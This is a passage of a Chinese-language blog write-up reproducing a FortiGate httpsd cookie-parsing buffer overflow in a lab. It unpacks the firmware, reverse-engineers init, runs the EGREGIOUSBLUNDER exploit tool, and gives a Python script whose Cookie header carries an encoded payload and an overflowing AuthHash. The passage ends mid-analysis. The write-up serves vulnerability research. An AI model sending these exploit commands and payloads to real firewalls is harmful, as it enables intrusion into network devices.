class="line">/dev/sdb1  *         1  262144  262144  128M 83 Linux</span><br><span class="line">/dev/sdb2       262145 4194304 3932160  1.9G 83 Linux</span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">mkdir</span> /mnt/fortios</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sdb1 /mnt/fortios</span></span><br></pre></td></tr></table></figure><p>之后我们便能够在 <code>/mnt</code> 目录下查看磁盘中的文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> /mnt/fortios</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 23392</span><br><span class="line">drwxr-xr-x 3 root root     1024 Sep 20  2011 ./</span><br><span class="line">drwxr-xr-x 5 root root     4096 Aug 10 18:43 ../</span><br><span class="line">-rw-r--r-- 1 root root  5182591 Sep 20  2011 datafs.tar.gz</span><br><span class="line">-rw-r--r-- 1 root root      107 Sep 20  2011 extlinux.conf</span><br><span class="line">lrwxrwxrwx 1 root root       12 Sep 20  2011 flatkc -&gt; ./flatkc.smp</span><br><span class="line">-rw-r--r-- 1 root root      256 Sep 20  2011 flatkc.chk</span><br><span class="line">-rw-r--r-- 1 root root  1437300 Sep 20  2011 flatkc.nosmp</span><br><span class="line">-rw-r--r-- 1 root root  1501003 Sep 20  2011 flatkc.smp</span><br><span class="line">-r--r--r-- 1 root root    32256 Sep 20  2011 ldlinux.sys</span><br><span class="line">drwx------ 2 root root    12288 Sep 20  2011 lost+found/</span><br><span class="line">-rw-r--r-- 1 root root 15678360 Sep 20  2011 rootfs.gz</span><br><span class="line">-rw-r--r-- 1 root root      256 Sep 20  2011 rootfs.gz.chk</span><br></pre></td></tr></table></figure><blockquote><p>也可以通过如下方式直接挂载镜像文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo modprobe nbd</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo qemu-nbd -r -c /dev/nbd1 ./fortios.vmdk</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo mount /dev/nbd1p1 /mnt</span></span><br></pre></td></tr></table></figure></blockquote><p>查看文件类型，我们可以发现两个内核镜像文件 <code>flatkc.smp</code> 与 <code>flatkc.nosmp</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">file *</span></span><br><span class="line">datafs.tar.gz: gzip compressed data, last modified: Tue Sep 20 20:17:56 2011, from Unix, original size modulo 2^32 8724480</span><br><span class="line">extlinux.conf: ASCII text</span><br><span class="line">flatkc:        symbolic link to ./flatkc.smp</span><br><span class="line">flatkc.chk:    data</span><br><span class="line">flatkc.nosmp:  Linux kernel x86 boot executable bzImage, version 2.4.25 (root@build170) #2 Tue Sep 20 12:46:19 PDT 2011, RO-rootFS, Normal VGA</span><br><span class="line">flatkc.smp:    Linux kernel x86 boot executable bzImage, version 2.4.25 (root@build170) #3 Tue Sep 20 12:49:39 PDT 2011, RO-rootFS, Normal VGA</span><br><span class="line">ldlinux.sys:   SYSLINUX loader (version 4.00)</span><br><span class="line">lost+found:    directory</span><br><span class="line">rootfs.gz:     gzip compressed data, last modified: Tue Sep 20 20:17:52 2011, from Unix, original size modulo 2^32 19077120</span><br><span class="line">rootfs.gz.chk: data</span><br></pre></td></tr></table></figure><p>在 <code>extlinux.conf</code> 中指定了一些基本配置，包括文件系统 <code>rootfs.gz</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> extlinux.conf</span> </span><br><span class="line">DEFAULT flatkc ro panic=5 endbase=0xA0000 console=tty0 root=/dev/ram0 ramdisk_size=65536 initrd=/rootfs.gz</span><br></pre></td></tr></table></figure><p>解压 <code>rootfs.gz</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar xf ./rootfs.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 28216</span><br><span class="line">drwxr-xr-x 10 arttnba3 arttnba3     4096 Sep 20  2011 ./</span><br><span class="line">drwxr-xr-x  5 arttnba3 arttnba3     4096 Aug 10 18:52 ../</span><br><span class="line">-rw-r--r--  1 arttnba3 arttnba3  8742988 Sep 20  2011 bin.tar.xz</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 data/</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 data2/</span><br><span class="line">drwxr-xr-x  5 arttnba3 arttnba3     4096 Sep 20  2011 dev/</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3        8 Sep 20  2011 etc -&gt; data/etc</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3        1 Sep 20  2011 fortidev -&gt; //</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 lib/</span><br><span class="line">-rw-r--r--  1 arttnba3 arttnba3  4424536 Sep 20  2011 migadmin.tar.xz</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 proc/</span><br><span class="line">-rw-r--r--  1 arttnba3 arttnba3 15678360 Aug 10 18:54 rootfs.gz</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 sbin/</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 tmp/</span><br><span class="line">drwxr-xr-x  8 arttnba3 arttnba3     4096 Sep 20  2011 var/</span><br></pre></td></tr></table></figure><h2 id="启动过程分析"><a href="#启动过程分析" class="headerlink" title="启动过程分析"></a>启动过程分析</h2><h3 id="I-init-进程"><a href="#I-init-进程" class="headerlink" title="I. init 进程"></a>I. init 进程</h3><p>Linux 内核载入后会启动第一个进程 <code>init</code>，程序二进制文件通常是 <code>/sbin/init</code>，该文件系统中的 init 文件较小，故我们可以直接将其拖入 IDA 进行分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *argv[<span class="number">2</span>]; <span class="comment">// [esp+0h] [ebp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)sub_8049254(<span class="string">&quot;bin&quot;</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    sub_8049254(<span class="string">&quot;migadmin&quot;</span>);</span><br><span class="line">  unlink(<span class="string">&quot;/sbin/xz&quot;</span>);</span><br><span class="line">  unlink(<span class="string">&quot;/sbin/ftar&quot;</span>);</span><br><span class="line">  argv[<span class="number">0</span>] = <span class="string">&quot;/bin/init&quot;</span>;</span><br><span class="line">  argv[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  execve(<span class="string">&quot;/bin/init&quot;</span>, argv, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>sub_8049254()</code> 核心逆向结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_8049254</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="built_in">snprintf</span>(s, <span class="number">0x200</span>u, <span class="string">&quot;/%s.tar.xz&quot;</span>, a1);</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  v1 = fork();</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      waitpid(v1, &amp;stat_loc, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( BYTE1(stat_loc) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">      unlink(s);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    argv[<span class="number">0</span>] = <span class="string">&quot;/sbin/xz&quot;</span>;</span><br><span class="line">    argv[<span class="number">1</span>] = <span class="string">&quot;--check=sha256&quot;</span>;</span><br><span class="line">    argv[<span class="number">2</span>] = <span class="string">&quot;-d&quot;</span>;</span><br><span class="line">    argv[<span class="number">3</span>] = s;</span><br><span class="line">    argv[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    execv(<span class="string">&quot;/sbin/xz&quot;</span>, argv);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">snprintf</span>(name, <span class="number">0x200</span>u, <span class="string">&quot;/%s.tar&quot;</span>, a1);</span><br><span class="line">  v3 = fork();</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//..</span></span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    waitpid(v3, &amp;v10, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !BYTE1(v10) )</span><br><span class="line">    &#123;</span><br><span class="line">      unlink(name);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_21:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;decompress init failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v12[<span class="number">0</span>] = <span class="string">&quot;/sbin/ftar&quot;</span>;</span><br><span class="line">  v12[<span class="number">1</span>] = <span class="string">&quot;-xf&quot;</span>;</span><br><span class="line">  v12[<span class="number">2</span>] = name;</span><br><span class="line">  v12[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">  execv(<span class="string">&quot;/sbin/ftar&quot;</span>, v12);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>故 init 进程分析如下：</p><ul><li>检查 <code>/bin.tar.xz</code> 是否存在，若是则创建子进程执行 <code>/sbin/xz --check=sha256 -d /bin.tar.xz</code>，父进程等待子进程结束后删除<code>/bin.tar.xz</code>，之后检查 <code>/bin.tar</code> 是否存在，若是则创建子进程执行 <code>/sbin/ftar -xf /bin.tar</code>，父进程等待子进程结束后删除<code>/bin.tar</code></li><li>上一步成功后检查 <code>/migadmin.tar.xz</code> 是否存在，若是则创建子进程执行 <code>/sbin/xz --check=sha256 -d /migadmin.tar.xz</code>，父进程等待子进程结束后删除<code>/migadmin.tar.xz</code>，之后检查 <code>/migadmin.tar</code> 是否存在，若是则创建子进程执行 <code>/sbin/ftar -xf /migadmin.tar</code>，父进程等待子进程结束后删除<code>/migadmin.tar</code></li><li>删除 <code>/sbin/xz</code></li><li>删除 <code>/sbin/ftar</code></li><li>执行 <code>/bin/init</code></li></ul><p>由于 <code>ftar</code> 与 <code>xz</code> 都指定了调用的库的目录如下：</p><p><img src="https://i.loli.net/2021/08/11/4exwH7Pkgh5JdGE.png" alt="image.png"></p><p>故需要通过切换根目录执行进行解压：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chroot</span> . /sbin/xz --check=sha256 -d /bin.tar.xz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chroot</span> . /sbin/ftar -xf /bin.tar</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chroot</span> . /sbin/xz --check=sha256 -d /migadmin.tar.xz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chroot</span> . /sbin/ftar -xf /migadmin.tar</span></span><br></pre></td></tr></table></figure><h3 id="II-bin-目录文件分析"><a href="#II-bin-目录文件分析" class="headerlink" title="II. bin 目录文件分析"></a>II. bin 目录文件分析</h3><p>我们可以看到的是，<code>bin.tar.xz</code> 解压出来的文件基本上都是指向 <code>/bin/init</code> 与 <code>/bin/sysctl</code> 的软链接</p><p>其中诸如 <code>httpsd</code> 等网络服务都是前者的软链接，可知前者应当为该防火墙提供的基本的网络服务</p><p>而诸如 <code>chmod</code> 等常用命令都是后者的软链接，可知后者应当为类似 busybox 一样的工具库，不过更为精简</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 31200</span><br><span class="line">drwxr-xr-x  2 root     root         4096 Aug 10 19:35 ./</span><br><span class="line">drwxr-xr-x 12 arttnba3 arttnba3     4096 Aug 10 19:37 ../</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 adsl_mon -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 alarmd -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 alertmail -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 authd -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 bgpd -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 cardctl -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 cardmgr -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root           11 Aug 10 19:35 cat -&gt; /bin/sysctl</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 cauploadd -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chassis5000d -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chassisd -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chat -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chlbd -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root           11 Aug 10 19:35 chmod -&gt; /bin/sysctl</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="III-x2F-bin-x2F-init-逆向分析"><a href="#III-x2F-bin-x2F-init-逆向分析" class="headerlink" title="III. &#x2F;bin&#x2F;init 逆向分析"></a>III. &#x2F;bin&#x2F;init 逆向分析</h3><p>拖入 IDA 进行分析：</p><p>首先会执行 <code>/bin/initXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</code> 替换自身，该文件其实是 <code>/bin/init</code> 的软链接，故这里本质上只是更改了 pid 与 argv[0]</p><p>随后会关闭三个标准文件描述符并改变当前工作目录为 <code>/</code>，打开 <code>/dev/null</code> 并创建三个指向其的文件描述符（0、1、2）</p><blockquote><p>笔者后续曾经一度认为利用失败就是因为没有注意到输入输出被重定向至 null 而无法在屏幕上打印出任何信息</p></blockquote><p><img src="https://i.loli.net/2021/08/11/vB5HUkGSR67P9yi.png" alt="image.png"></p><p>启动后的界面如下：</p><p><img src="https://i.loli.net/2021/08/11/pRVcK5Z1szT2uU3.png" alt="image.png"></p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>首先为我们的虚拟机配置一个本地 ip</p><p><img src="https://i.loli.net/2021/08/11/YzTN9P82sJiaBFc.png" alt="4M4_Z96@_NSPZR087A2_6QC.png"></p><p>接下来我们还需要获取到一个 cookie num：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -X HEAD -v http://192.168.116.100/login  2&gt;&amp;1 | grep <span class="string">&#x27;APSCOOKIE&#x27;</span></span></span><br><span class="line">&lt; Set-Cookie: APSCOOKIE_3943997904=0&amp;0; path=/; expires=Tue, 24-Aug-1971 18:40:48 GMT</span><br></pre></td></tr></table></figure><p>之后使用 <code>egregiousblunder</code> 测试该漏洞，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./egregiousblunder_3.0.0.1 -t 192.168.116.100 -p 80 -l 4444 --ssl 0 --nope --gen 4nc --config EGBL.config --cookienum 3943997904 --stack 0xbffff114</span></span><br><span class="line">loading nopen over HTTP</span><br><span class="line">using stack addr 0xbffff114</span><br><span class="line">built authhash len 116</span><br><span class="line">built enc_authhash with len 116</span><br><span class="line">problem recv&#x27;ing ack1/hello, stack address probably wrong.  WAM might work?</span><br><span class="line">problem with sending file</span><br><span class="line">failure loading nopen over HTTP</span><br></pre></td></tr></table></figure><p>此时在 fortigate 的 CLI 中我们便可以看到 httpsd 服务的崩溃信息及栈回溯</p><p><img src="https://i.loli.net/2021/08/11/fOPSQBG2elVkKja.png" alt="image.png"></p><p>但是这里没能够成功获得一个 shell，初步猜测是 EGREGIOUSBLUNDER 的版本问题</p><p>使用 wireshark 截取 EGREGIOUSBLUNDER 所发送的数据包进行分析，我们可以发现 <code>0xbffff114</code> 这个地址被布置到了http请求头的 Cookie 中的 <code>AuthHash</code> 字段，初步推测这应当是作为一个返回地址被布置上去的，说明可能是一个栈溢出漏洞，这也与 CVE 通告所说的【cookie 解析过程中发生缓冲区溢出】相吻合</p><p><img src="https://i.loli.net/2021/08/12/nKClEmcT15JAQot.png" alt="image.png"></p><p>使用 postman 简单仿造该 http 请求如下，使用字符 <code>A</code> 简单填充 AuthHash 字段：</p><p><img src="https://i.loli.net/2021/08/12/XetkB3iWlKNaqjg.png" alt="image.png"></p><p>当我们的字符 A 数量达到 0x60 时再一次发生了 crash，不过这一次的栈回溯更为详细</p><p><img src="https://i.loli.net/2021/08/12/ZHqku5i3BED8QlR.png" alt="image.png"></p><p>为了方便构造 payload 进行利用，接下来笔者选择使用 python 发送 http 请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line">url = <span class="string">&#x27;http://192.168.116.100/index&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Length&#x27;</span>:<span class="string">&#x27;12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip,deflate,br&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;PostmanRuntime/7.28.3&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;192.168.116.100&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;APSCOOKIE_3943997904=Era=0&amp;Payload=ëYÿáèøÿÿÿPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&amp;AuthHash=&#x27;</span> + <span class="string">&#x27;A&#x27;</span> * <span class="number">0x60</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">r = post(url, headers = headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>(r.headers)</span><br></pre></td></tr></table></figure><h2 id="定位溢出点"><a href="#定位溢出点" class="headerlink" title="定位溢出点"></a>定位溢出点</h2><blockquote><p>由于一些特殊原因，笔者本地无法直接启动其 init 程序</p><p>笔者本想将 gdb 等打包进其文件系统中直接在虚拟机内进行调试，奈何文件系统实在太老，重打包后没有一次启动成功的，只好作罢…</p></blockquote><p>我们首先根据这个报错信息进行栈回溯：</p><p><img src="https://i.loli.net/2021/08/12/ZHqku5i3BED8QlR.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:08C38A77                 call    sub_8C389B7</span><br><span class="line">.text:08C38A7C                 mov     ebx, [ebp+var_4]</span><br><span class="line">.text:08C38A7F                 leave</span><br><span class="line">.text:08C38A80                 retn</span><br><span class="line">.text:08C38A80 sub_8C38A61     endp</span><br></pre></td></tr></table></figure><p>找到 <code>sub_8C389B7()</code> 函数，我们发现其最终会调用 <code>sub_8C38440()</code> 函数，简单分析我们不难知道该调用链仅仅是用于打印报错信息</p><p><img src="https://i.loli.net/2021/08/12/NYucT3GlibfU8dW.png" alt="image.png"></p><p>继续分析其调用链，libc offset 0x1d218 处代码如下，该段代码位于 libc 中函数 <code>__libc_sigaction()</code>，用以进行 <code>sigreturn</code> 系统调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:0001D210 loc_1D210:                              ; DATA XREF: __libc_sigaction+CA↓o</span><br><span class="line">.text:0001D210                 mov     eax, 0ADh</span><br><span class="line">.text:0001D215                 int     80h             ; LINUX - sys_rt_sigreturn</span><br><span class="line">.text:0001D217                 nop</span><br><span class="line">.text:0001D218 loc_1D218:                              ; DATA XREF: __libc_sigaction+D9↓o</span><br><span class="line">.text:0001D218                 pop     eax</span><br><span class="line">.text:0001D219                 mov     eax, 77h ; &#x27;w&#x27;</span><br><span class="line">.text:0001D21E                 int     80h             ; LINUX - sys_sigreturn</span><br></pre></td></tr></table></figure><p>继续回溯，<code>0x8204F8D</code> 的上一条指令调用了 <code>sub_820483B()</code> 函数，通过逆向我们发现该函数会调用 <code>sub_820429D()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_820429D</span><span class="params">(<span class="type">int</span> *a1, _BYTE *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> **v4; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">void</span> *v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// esi</span></span><br><span class="line">  